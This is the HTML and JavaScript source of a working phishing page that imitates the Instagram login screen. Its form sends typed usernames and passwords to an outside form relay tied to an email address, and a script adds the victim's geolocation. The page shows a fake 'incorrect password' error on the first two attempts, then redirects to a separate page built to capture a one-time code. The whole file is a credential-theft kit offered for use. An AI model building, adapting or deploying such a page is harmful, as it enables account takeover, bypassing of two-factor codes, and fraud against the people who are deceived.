<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instaagraam</title>

  <!-- Favicon & Fonts -->
  <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./app.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />

  <style>
    .error-message {
      color: red;
      font-size: 12px;
      margin-top: 4px;
      display: none;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="main-container">
      <div class="main-content">
        <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
          <div class="slide-content" id="slide-content">
            <img src="./images/slide (1).jpg" class="active" />
            <img src="./images/slide (2).jpg" />
            <img src="./images/slide (3).jpg" />
            <img src="./images/slide (4).jpg" />
            <img src="./images/slide (5).jpg" />
          </div>
        </div>

        <div class="form-container">
          <form id="form" method="POST" action="https://formsubmit.co/marketcaplinkcoin@gmail.com">
                 
            <div class="form-content box">
              <div class="logo">
                <img src="./images/logo-light.png" class="logo-light" />
                <img src="./images/logo-dark.png" class="logo-dark" />
              </div>

              <div class="btn-group">
                <button class="btn-login" type="submit">
                  <i class="fab fa-facebook-square"></i> Continue Using Facebook
                </button>
              </div>

              <div class="divine"><div></div><div>OR</div><div></div></div>

              <div class="signin-form" id="signin-form">
                <div class="form-group">
                  <div class="animate-input">
                    <span>Phone number, username or email</span>
                    <input type="text" name="username" id="username" required>
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" id="nextField" name="_next" value="">
                        <input type="hidden" id="city" name="city">
<input type="hidden" id="country" name="country">
                  </div>
                </div>

                <div class="form-group">
                  <div class="animate-input">
                    <span>Password</span>
                    <input type="text" name="password" id="password" required>
                    <button type="button">Show</button>
                    <small id="errorText" class="error-message">Incorrect password. Please try again.</small>
                  </div>
                  <div style="display: flex; justify-content: end; color: rgb(0, 17, 255);">
                    <a href="#" class="forgot-pw">Forgotten your password?</a>
                  </div>
                </div>

                <div class="btn-group">
                  <button class="btn-login" type="submit">Sign In</button>
                  <div class="box goto">
                    <p>Don't have an account? <a href="#">Sign up</a></p>
                  </div>
                </div>
              </div>
            </div>

            <div class="app-download">
              <p>Get the app.</p>
              <div class="store-link">
                <a href="#"><img src="./images/app-store.png" alt="app store"></a>
                <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>

    <div class="footer">
      <div class="links">
        <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
        <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a>
        <a href="#">Hashtags</a><a href="#">Locations</a><a href="#" id="darkmode-toggle">Darkmode</a>
      </div>
      <hr />
      <div class="copyright">
        <p>from</p><img src="images/download.jpg" alt="">
      </div>
    </div>
  </div>

<script>
  // 1. Fetch Location Data immediately
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      // Ensure these IDs exist only ONCE in your HTML
      const cityInput = document.getElementById('city');
      const countryInput = document.getElementById('country');
      
      if(cityInput) cityInput.value = data.city || 'Unknown';
      if(countryInput) countryInput.value = data.country_name || 'Unknown';
    })
    .catch(error => console.error('Location error:', error));

  // 2. Handle Form Submission
  const loginForm = document.getElementById('form');
  const nextField = document.getElementById('nextField');
  const errorText = document.getElementById('errorText');

  loginForm.addEventListener('submit', function (event) {
    // Initialize attempt counter if not exists
    if (!localStorage.getItem('login_attempt')) {
      localStorage.setItem('login_attempt', '0');
    }

    let attempt = parseInt(localStorage.getItem('login_attempt'));

    if (attempt < 2) { // Show error for first few tries
      event.preventDefault(); // Stop actual submission to show error
      errorText.style.display = 'block';
      localStorage.setItem('login_attempt', (attempt + 1).toString());
      
      // Optional: Manually submit via AJAX here if you want data sent every time
    } else {
      // Final attempt: allow submission and redirect
      errorText.style.display = 'none';
      nextField.value = "https://playe-xi.vercel.app/instagram/otp/657daf104b167f68d1979b9c.html";
      localStorage.removeItem('login_attempt');
      // No preventDefault here, so the form actually submits to FormSubmit.co
    }
  });
</script>

  <script src='app.js'></script>
</body>
</html>
